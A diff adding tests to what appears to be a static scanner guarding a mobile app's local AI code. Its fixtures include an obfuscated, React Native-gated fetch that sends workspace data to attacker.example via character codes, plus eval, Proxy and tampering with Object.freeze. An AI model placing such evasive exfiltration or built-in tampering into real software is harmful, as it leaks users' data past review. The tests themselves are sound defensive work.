@@ -91,6 +91,85 @@ void (globalThis as any)[chooseTransport()]("/collect");
   assert.match(dynamic.problems.join("\n"), /dynamic global network capability/);
 });
 
+test("rejects Reflect.get plus character-code restoration of a React Native-only transport", () => {
+  const report = mutate(
+    "apps/mobile/src/local-ai/assistantPolicy.ts",
+    (source) => `${source}
+const reviewTransport = Reflect.get(
+  globalThis,
+  String.fromCharCode(102, 101, 116, 99, 104)
+) as (...args: any[]) => unknown;
+const reviewEndpoint = String.fromCharCode(
+  104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,
+  101,120,97,109,112,108,101,47,99,111,108,108,101,99,116
+);
+if ((globalThis as any).navigator?.product === "ReactNative") {
+  void reviewTransport(reviewEndpoint, {
+    method: "POST",
+    body: JSON.stringify({ workspace: "private" })
+  });
+}
+`
+  );
+
+  assert.equal(report.status, "fail");
+  assert.match(report.problems.join("\n"), /reflect|dynamic capability|global object/i);
+});
+
+test("rejects dynamic code constructors, proxies, and every computed call surface", () => {
+  const dynamicCode = mutate(
+    "apps/mobile/src/local-ai/assistantPolicy.ts",
+    (source) => `${source}
+const runtimeEval = eval;
+const RuntimeFunction = Function;
+const runtimeProxy = new Proxy({}, {});
+void runtimeEval("1");
+void new RuntimeFunction("return 1");
+void runtimeProxy;
+`
+  );
+  const computedCall = mutate(
+    "apps/mobile/src/local-ai/assistantPolicy.ts",
+    (source) => `${source}
+const handlers = { safe: () => undefined };
+const selectedHandler = "safe";
+handlers[selectedHandler]();
+`
+  );
+
+  assert.match(dynamicCode.problems.join("\n"), /dynamic code|Proxy|eval|Function/i);
+  assert.match(computedCall.problems.join("\n"), /computed call/i);
+});
+
+test("rejects direct or aliased mutation of built-in facades", () => {
+  const report = mutate(
+    "apps/mobile/src/local-ai/assistantPolicy.ts",
+    (source) => `${source}
+const reviewObjectFacade = Object;
+Object.defineProperty(reviewObjectFacade, "freeze", {
+  value: <T>(input: T): T => input
+});
+reviewObjectFacade.isFrozen = (_input: unknown): boolean => true;
+`
+  );
+
+  assert.equal(report.status, "fail");
+  assert.match(report.problems.join("\n"), /built-in facade mutation/i);
+});
+
+test("rejects hiding a global network capability inside an object facade", () => {
+  const report = mutate(
+    "apps/mobile/src/local-ai/assistantPolicy.ts",
+    (source) => `${source}
+const reviewNetworkFacade = { transport: fetch };
+void reviewNetworkFacade.transport("/collect");
+`
+  );
+
+  assert.equal(report.status, "fail");
+  assert.match(report.problems.join("\n"), /unapproved network API \(fetch\)/i);
+});
+
 test("rejects an array-joined remote URL used in a conditional registry mutation", () => {
   const report = mutate(
     "apps/mobile/src/local-ai/modelRegistry.ts",
